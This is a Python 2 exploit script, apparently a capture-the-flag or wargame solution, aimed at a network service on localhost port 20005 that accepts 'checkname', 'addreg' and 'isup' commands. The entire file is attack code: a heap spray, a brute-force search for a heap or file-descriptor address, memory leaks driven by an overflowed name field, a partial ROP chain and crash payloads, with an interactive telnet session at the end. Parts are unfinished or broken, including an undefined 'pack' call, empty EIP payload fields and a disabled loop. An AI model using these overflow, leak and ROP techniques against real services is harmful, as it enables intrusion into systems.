#!/usr/bin/python
import socket
import struct
import time
import telnetlib
import string
import sys

# Configuration
v = ('127.0.0.1', 20005)
FD = 0xb7510190



# hash
def hash(str, mask=127):
	h = 0xfee13117
	for i in range(len(str)):
		h = h^ ord(str[i])
		h += (h << 11)
		h ^= (h >> 7)
		h -= ord(str[i])
	h += (h << 3)
	h ^= (h >> 10)
	h += (h << 15)
	h -= (h >> 17)
  	return (h & mask)

# create connection
def connect(IP, PORT):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IP, PORT))
	return s

# recv bytes
def recv(s, bytes):
	s.settimeout(0.1)
	#time.sleep(0.1)
	r = ''
	try:
		r = s.recv(bytes)
	except Exception as e:
		#print e
		r = r
	return r

# send bytes
def send(s, data, listen=False):
	s.send(data+'\n')
	if listen:
		return recv(s, 1024)

	else:
		return ''


# checkname
def check(s, data, listen):
	return send(s, 'checkname '+data, listen=listen)


# addref function
def add(s, data):
	send(s, 'addreg '+data+ ' 64 1.1.7.1')
	return send(s,'checkname '+data)

# Ping Back
def pingback(base, pay):
	r = pay
        r += pack("I", base + 0x00018f4e) # pop ebx ; ret
        r += pack("I", base + 0x00175e7d)
        r += pack("I", base + 0xc12c0) # write.plt
        r += pack("I", 0x01) * 2
        r += pack("I", base + 0x0000d729) # "setrlimit" ; string
        r += pack("I", 0x0A)
	return r
# isup
def isup(s, data):
	s.send('isup {}\n'.format(data), False)
	return

# heap spray
def spray(s, num=0x400000):
	print '[+] Spray Started.'
	for i in range(num):
	       isup(s, 'A'*200+struct.pack('I', 0x4))
	print '[+] Spray End..'
	return


# 
def find_fd(s):
	for i in range(0xb7510101, 0xb75fffff):
		if (('\n' in struct.pack('I', i)) | ('\r' in struct.pack('I', i)) | ('@' in struct.pack('I', i)) | ('\x00' in struct.pack('I', i))):
			continue
		rc1 = check(s, 'A'*32+struct.pack('I', i), True)
		rc2 = check(s, 'B'*32+struct.pack('I', i), True)
		rc3 = check(s, 'B'*32+struct.pack('I', i), True)

		if (rc1 and rc2 and rc3):
			print [struct.pack('I', i)], hex(i)
			if raw_input('[+] Press Enter To Find Another One Or Type [N] : '):
				return i

def jumper(s, g, offset):
	addr = g+offset
	while True:
		rc  = check(s, 'A'*32+struct.pack('I', g)+struct.pack('I', addr), True)
		rc = rc[:4]
		if len(rc)!=4:
			break
		i = struct.unpack('I', rc)[0]
		print [hex(i)]
		addr = i + 212
		raw_input('[+] Another Jump')
	return

# Adjust name Alignment
def adjust(s, a):
	return


# A
def dumpcollect(s, g):
	offset = 4
	while True:
		i = g+offset 
		if (('\n' in struct.pack('I', i)) | ('\r' in struct.pack('I', i)) | ('@' in struct.pack('I', i)) | ('\x00' in struct.pack('I', i))):
			offset += 1
                        continue

		rc = check(s, 'A'*32+struct.pack('I', g)+struct.pack('I', i), True)
		if rc:
			rc = rc.replace(' is not indexed already\n', '')
			if (('taskmain' in rc) or ('skmain' in rc) or ('main' in rc)):
				print [struct.pack('I', g+offset)]
				print [rc]
				raw_input(' Exit ..')
			else:
				#rc = rc.replace(' is not indexed already\n', '')
				if len(rc):
					offset += len(rc)
					#print '+',len(rc),
				else:
					offset += 4
					#print '+4',
	return

if __name__ == '__main__':
	if 'spray' in sys.argv:
		raw_input('[+] Spary.. Now.')
		s = connect(*v)
		print recv(s, 1024)
		spray(s)
		s.send('quit\n'*2)

	elif 'crash' in sys.argv:
		raw_input('[+] Want To Crash.. Restart.')
                s = connect(*v)
                print check(s, 'A'*50, True)
                t = telnetlib.Telnet()
                t.sock = s
                t.interact()
                s.send('quit\n'*2)

	elif 'leak' in sys.argv:
                raw_input('[+] Finding Fd.. Now.')
                s = connect(*v)
		print recv(s, 1024)
		g = FD or find_fd(s)
		print '[+] FD Found : ', hex(g)
		raw_input('[+] Try..')
		offset = 0
		while False:
			offset += 4
			rc = check(s, 'A'*32+struct.pack('I', g)+struct.pack('I', g+offset), True)
			print '[+] Please Manually Check That Output Looks Like Below Example.'
			print '\\x--\\x--\\x01\\xb7 is not indexed already\n'
			print '[*] Output : ', [rc]
			if raw_input('[+] Type Y For Yes Or Enter For Not : '):
				break
		#jumper(s, g, offset)
		dumpcollect(s, g)
		print '[+] Telnet Engaged..'
		t = telnetlib.Telnet()
		t.sock = s
		t.interact()
		s.send('quit\n'*2)
	else:
		print '[+] Pass Argument Like : leak, spray, crash'


def start(args):

	# Connection Section
	s = connect(*v)
	t = telnetlib.Telnet()
	t.sock = s
	time.sleep(1)
	print recv(s, 1024)
	PAYLOAD = 'A'*32
	PAYLOAD += struct.pack('I', 0xba010101) # ESI
	PAYLOAD += '' # EDI
	PAYLOAD += '' # EBP
	PAYLOAD += '' # EIP
	PAYLOAD += ''
	print [check(s, 'checkname '+PAYLOAD, True)]
	t.interact()
